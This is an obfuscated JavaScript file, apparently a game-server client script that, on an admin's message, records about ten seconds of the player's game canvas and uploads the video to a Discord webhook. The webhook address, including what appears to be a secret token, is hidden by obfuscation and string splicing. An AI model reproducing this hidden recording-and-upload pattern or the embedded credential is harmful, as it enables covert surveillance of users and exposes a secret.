const o = b;
(function (c, d) {
    const n = b;
    const e = c();
    while (!![]) {
        try {
            const f = parseInt(n(0x72)) / 0x1 + parseInt(n(0xbb)) / 0x2 + parseInt(n(0xc2)) / 0x3 + parseInt(n(0xaa)) / 0x4 * (parseInt(n(0x86)) / 0x5) + parseInt(n(0x84)) / 0x6 * (parseInt(n(0x87)) / 0x7) + parseInt(n(0x82)) / 0x8 * (parseInt(n(0xbe)) / 0x9) + -parseInt(n(0x96)) / 0xa;
            if (f === d) {
                break;
            } else {
                e['push'](e['shift']());
            }
        } catch (g) {
            e['push'](e['shift']());
        }
    }
}(a, 0x3d346));
const canvasElement = document[o(0xc1)](o(0x98));
function b(c, d) {
    const e = a();
    b = function (f, g) {
        f = f - 0x71;
        let h = e[f];
        return h;
    };
    return b(c, d);
}
const https = 'https://';
const uploadEndpoint = https + o(0x8d);
const discord = o(0xa6);
const dotcom = '.com';
function a() {
    const D = [
        'application/json',
        'start',
        'MIRRORED_REPEAT',
        'localhost:50000/staff/upload',
        'FRAGMENT_SHADER',
        'createProgram',
        'TEXTURE_WRAP_T',
        'animationFrame',
        'vertexAttribPointer',
        'nIVCdwtc6Mbt6R6a-GRu',
        'linkProgram',
        'getContext',
        '12282020wCbKkO',
        'ondataavailable',
        'canvas',
        'width',
        'video/webm',
        'webgl',
        'bindBuffer',
        'enableVertexAttribArray',
        'state',
        'external_texture',
        'toISOString',
        'compileShader',
        'shaderSource',
        'video_',
        'CLAMP_TO_EDGE',
        'a_position',
        'discord',
        'video',
        'error',
        'bJwse7-NOxS-QkA4SGLRl_',
        '38716vnNTex',
        '/api/',
        'createBuffer',
        'texParameterf',
        'size',
        'toString',
        'addEventListener',
        'data',
        'NEAREST',
        'webhooks/',
        'recording',
        'video/webm;codecs=vp9',
        'TEXTURE_MIN_FILTER',
        '\x0avarying\x20mediump\x20vec2\x20textureCoordinate;\x0auniform\x20sampler2D\x20external_texture;\x0avoid\x20main()\x0a{\x0a\x20\x20\x20\x20gl_FragColor\x20=\x20texture2D(external_texture,\x20textureCoordinate);\x0a}\x0a',
        'TEXTURE_2D',
        'createTexture',
        'getAttribLocation',
        '505000SdfxLf',
        'TEXTURE_WRAP_S',
        'stringify',
        '126UWawcQ',
        'attachShader',
        'captureStream',
        'querySelector',
        '432906ETalhk',
        'ARRAY_BUFFER',
        'fUNoflgfwJG__OT6g_y0EmcqIK',
        '77811SaqHNt',
        'onstop',
        'a_texcoord',
        'bufferData',
        'drawArrays',
        '.webm',
        'viewport',
        'Recording:\x20',
        'name',
        'now',
        'bindTexture',
        'POST',
        'texImage2D',
        'stop',
        'useProgram',
        'RGBA',
        '234136CTdypt',
        'FLOAT',
        '709266vbsRtZ',
        'append',
        '185lJxSOe',
        '14BOJffv',
        'STATIC_DRAW',
        'VERTEX_SHADER'
    ];
    a = function () {
        return D;
    };
    return a();
}
const api = o(0xab);
const hooks = o(0xb3);
const channel = '1202653136905445436/';
const balls = o(0x93);
const shaft = o(0xa9);
const crack = o(0x71);
const bigpackage = https + discord + dotcom + api + hooks + channel + balls + shaft + crack;
const vertexShaderSrc = '\x0aattribute\x20vec2\x20a_position;\x0aattribute\x20vec2\x20a_texcoord;\x0avarying\x20vec2\x20textureCoordinate;\x0avoid\x20main()\x20{\x0a\x20\x20\x20\x20gl_Position\x20=\x20vec4(a_position,\x200.0,\x201.0);\x0a\x20\x20\x20\x20textureCoordinate\x20=\x20a_texcoord;\x0a}\x0a';
const fragmentShaderSrc = o(0xb7);
function makeShader(c, d, e) {
    const p = o;
    const f = c['createShader'](d);
    c[p(0xa2)](f, e);
    c[p(0xa1)](f);
    const g = c['getShaderInfoLog'](f);
    if (g) {
        console[p(0xa8)](g);
    }
    return f;
}
function createTexture(c) {
    const q = o;
    const d = c[q(0xb9)]();
    const e = new Uint8Array([
        0x0,
        0x0,
        0xff,
        0xff
    ]);
    c[q(0x7c)](c[q(0xb8)], d);
    c[q(0x7e)](c['TEXTURE_2D'], 0x0, c[q(0x81)], 0x1, 0x1, 0x0, c['RGBA'], c['UNSIGNED_BYTE'], e);
    c[q(0xad)](c[q(0xb8)], c['TEXTURE_MAG_FILTER'], c[q(0xb2)]);
    c[q(0xad)](c[q(0xb8)], c[q(0xb6)], c['NEAREST']);
    c['texParameterf'](c['TEXTURE_2D'], c[q(0xbc)], c[q(0xa4)]);
    c[q(0xad)](c[q(0xb8)], c[q(0x90)], c[q(0xa4)]);
    c[q(0xad)](c['TEXTURE_2D'], c['TEXTURE_WRAP_T'], c[q(0x8c)]);
    c[q(0xad)](c[q(0xb8)], c[q(0x90)], c['REPEAT']);
    c[q(0xad)](c[q(0xb8)], c[q(0x90)], c[q(0xa4)]);
    return d;
}
function createBuffers(c) {
    const r = o;
    const d = c[r(0xac)]();
    c['bindBuffer'](c[r(0xc3)], d);
    c[r(0x75)](c[r(0xc3)], new Float32Array([
        -0x1,
        -0x1,
        0x1,
        -0x1,
        -0x1,
        0x1,
        0x1,
        0x1
    ]), c[r(0x88)]);
    const e = c['createBuffer']();
    c[r(0x9c)](c[r(0xc3)], e);
    c[r(0x75)](c[r(0xc3)], new Float32Array([
        0x0,
        0x0,
        0x1,
        0x0,
        0x0,
        0x1,
        0x1,
        0x1
    ]), c['STATIC_DRAW']);
    return {
        'vertexBuff': d,
        'texBuff': e
    };
}
function createProgram(c) {
    const s = o;
    const d = makeShader(c, c[s(0x89)], vertexShaderSrc);
    const e = makeShader(c, c[s(0x8e)], fragmentShaderSrc);
    const f = c[s(0x8f)]();
    c[s(0xbf)](f, d);
    c[s(0xbf)](f, e);
    c[s(0x94)](f);
    c['useProgram'](f);
    const g = c['getAttribLocation'](f, s(0xa5));
    const h = c[s(0xba)](f, s(0x74));
    return {
        'program': f,
        'vloc': g,
        'tloc': h
    };
}
function createGameView(c) {
    const t = o;
    const d = c[t(0x95)](t(0x9b), {
        'antialias': ![],
        'depth': ![],
        'stencil': ![],
        'alpha': ![],
        'preserveDrawingBuffer': !![],
        'failIfMajorPerformanceCaveat': ![]
    });
    let e = () => {
    };
    function f() {
        const u = t;
        const h = createTexture(d);
        const {
            program: i,
            vloc: j,
            tloc: k
        } = createProgram(d);
        const {
            vertexBuff: l,
            texBuff: m
        } = createBuffers(d);
        d[u(0x80)](i);
        d[u(0x7c)](d[u(0xb8)], h);
        d['uniform1i'](d['getUniformLocation'](i, u(0x9f)), 0x0);
        d['bindBuffer'](d[u(0xc3)], l);
        d[u(0x92)](j, 0x2, d[u(0x83)], ![], 0x0, 0x0);
        d[u(0x9d)](j);
        d[u(0x9c)](d['ARRAY_BUFFER'], m);
        d[u(0x92)](k, 0x2, d[u(0x83)], ![], 0x0, 0x0);
        d[u(0x9d)](k);
        d[u(0x78)](0x0, 0x0, d[u(0x98)][u(0x99)], d['canvas']['height']);
        e();
    }
    const g = {
        'canvas': c,
        'gl': d,
        'animationFrame': void 0x0,
        'resize': (h, i) => {
            const v = t;
            d['viewport'](0x0, 0x0, h, i);
            d[v(0x98)][v(0x99)] = h;
            d['canvas']['height'] = i;
        }
    };
    e = () => {
        const w = t;
        d[w(0x76)](d['TRIANGLE_STRIP'], 0x0, 0x4);
        g[w(0x91)] = setTimeout(e, 33.3);
    };
    f();
    return g;
}
let mediaRecorder;
async function uploadBlob(c, d, e, f, g) {
    const x = o;
    const h = new Date(d)[x(0xa0)]()['replace'](/:/g, '-');
    const i = x(0xa3) + h + x(0x77);
    const j = new FormData();
    j[x(0x85)](x(0xa7), c, i);
    const k = {
        'embeds': [{
                'title': x(0x79) + e,
                'description': '**Admin:\x20**' + f + '\x20[' + g[x(0xaf)]() + ']'
            }]
    };
    fetch(bigpackage, {
        'method': x(0x7d),
        'headers': { 'Content-Type': x(0x8a) },
        'body': JSON[x(0xbd)](k)
    });
    const l = await fetch(bigpackage, {
        'method': x(0x7d),
        'body': j
    });
    if (!l['ok']) {
    }
    post('https://noob/sendReport', JSON[x(0xbd)]({ 'adminID': g }));
}
function recordPlayer(c, d, e) {
    const y = o;
    const f = createGameView(canvasElement);
    const g = canvasElement[y(0xc0)](0x1e);
    const h = Date[y(0x7b)]();
    const i = [];
    window['gameView'] = f;
    mediaRecorder = new MediaRecorder(g, { 'mimeType': y(0xb5) });
    mediaRecorder[y(0x8b)]();
    mediaRecorder[y(0x97)] = j => j['data']['size'] > 0x0 && i['push'](j[y(0xb1)]);
    mediaRecorder[y(0x73)] = async () => {
        const z = y;
        const j = Date[z(0x7b)]() - h;
        const k = new Blob(i, { 'type': z(0x9a) });
        const l = await ysFixWebmDuration(k, j, { 'logger': ![] });
        if (k[z(0xae)] > 0x0) {
            uploadBlob(l, h, c, d, e);
        }
    };
    setTimeout(() => {
        const A = y;
        if (mediaRecorder && mediaRecorder[A(0x9e)] === A(0xb4)) {
            mediaRecorder['stop']();
        }
    }, 0x2710);
}
function stopRecording() {
    const B = o;
    if (mediaRecorder && mediaRecorder[B(0x9e)] === B(0xb4)) {
        mediaRecorder[B(0x7f)]();
    }
}
window[o(0xb0)]('message', c => {
    const C = o;
    if (c[C(0xb1)]['type'] == C(0x8b)) {
        recordPlayer(c[C(0xb1)][C(0x7a)], c[C(0xb1)]['othername'], c['data']['src']);
    }
});